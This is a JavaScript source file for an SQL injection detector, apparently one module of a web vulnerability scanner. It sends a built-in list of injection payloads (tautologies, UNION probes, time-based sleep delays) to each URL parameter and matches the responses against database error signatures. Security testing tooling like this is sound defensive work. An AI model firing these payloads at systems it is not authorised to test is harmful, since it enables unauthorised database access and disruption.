import axios from 'axios';

export class SQLInjectionDetector {
  constructor() {
    this.name = 'SQL Injection';
    this.payloads = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "admin' --",
      "admin' #",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' AND 1=CONVERT(int, (SELECT @@version))--",
      "1' ORDER BY 1--",
      "1' ORDER BY 2--",
      "1' ORDER BY 3--",
      "' OR SLEEP(5)--",
      "' OR pg_sleep(5)--",
      "1'; WAITFOR DELAY '0:0:5'--",
      "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
    ];

    this.errorPatterns = [
      /SQL syntax.*MySQL/i,
      /Warning.*mysql_/i,
      /valid MySQL result/i,
      /MySqlClient\./i,
      /PostgreSQL.*ERROR/i,
      /Warning.*pg_/i,
      /valid PostgreSQL result/i,
      /Npgsql\./i,
      /Driver.* SQL[\-\_\ ]*Server/i,
      /OLE DB.* SQL Server/i,
      /\bSQL Server[^&lt;&quot;]+Driver/i,
      /Warning.*mssql_/i,
      /\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}/i,
      /System\.Data\.SqlClient\./i,
      /(?i)Exception.*\bORA-[0-9][0-9][0-9][0-9]/i,
      /Oracle error/i,
      /Oracle.*Driver/i,
      /Warning.*oci_/i,
      /quoted string not properly terminated/i,
      /SQLite\/JDBCDriver/i,
      /SQLite.Exception/i,
      /System.Data.SQLite.SQLiteException/i,
      /Warning.*sqlite_/i,
      /SQLITE_ERROR/i,
      /syntax error/i,
      /unclosed quotation mark/i,
      /unterminated string literal/i
    ];
  }

  async detect(endpoint) {
    const vulnerabilities = [];

    if (!endpoint.parameters || endpoint.parameters.length === 0) {
      return vulnerabilities;
    }

    for (const param of endpoint.parameters) {
      for (const payload of this.payloads) {
        try {
          const testUrl = this.buildTestUrl(endpoint.url, param, payload);
          const response = await axios.get(testUrl, {
            timeout: 10000,
            validateStatus: () => true,
            maxRedirects: 0
          });

          const baselineResponse = await axios.get(endpoint.url, {
            timeout: 10000,
            validateStatus: () => true
          });

          if (this.isVulnerable(response, baselineResponse)) {
            vulnerabilities.push({
              type: 'SQL_INJECTION',
              severity: 'CRITICAL',
              url: testUrl,
              parameter: param,
              payload: payload,
              evidence: this.extractEvidence(response.data),
              description: `SQL Injection vulnerability detected in parameter '${param}'`,
              impact: 'Attacker can read, modify, or delete database contents, potentially leading to complete system compromise',
              remediation: 'Use parameterized queries (prepared statements) instead of string concatenation. Implement input validation and sanitization.',
              cwe: 'CWE-89',
              owasp: 'A03:2021 – Injection',
              reproductionSteps: this.generateReproductionSteps(testUrl, param, payload),
              curlCommand: this.generateCurlCommand(testUrl)
            });
            break;
          }
        } catch (error) {
          // Network errors are expected
        }
      }
    }

    return vulnerabilities;
  }

  buildTestUrl(baseUrl, param, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(param, payload);
    return url.toString();
  }

  isVulnerable(testResponse, baselineResponse) {
    const testData = testResponse.data.toString();

    for (const pattern of this.errorPatterns) {
      if (pattern.test(testData)) {
        return true;
      }
    }

    if (testResponse.data.length > baselineResponse.data.length * 1.5) {
      if (testData.match(/\b(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|UNION)\b/gi)) {
        return true;
      }
    }

    return false;
  }

  extractEvidence(data) {
    const dataStr = data.toString().substring(0, 500);
    return dataStr.replace(/</g, '&lt;').replace(/>/g, '&gt;');
  }

  generateReproductionSteps(url, param, payload) {
    return [
      `1. Open a web browser and navigate to: ${url}`,
      `2. Observe the parameter '${param}' with payload: ${payload}`,
      `3. Check for SQL error messages in the response`,
      `4. Look for database-specific error messages (MySQL, PostgreSQL, SQL Server, Oracle, SQLite)`,
      `5. Verify that the application's behavior differs from normal input`
    ];
  }

  generateCurlCommand(url) {
    return `curl -X GET "${url}" -H "User-Agent: Kadedee-Scanner"`;
  }
}
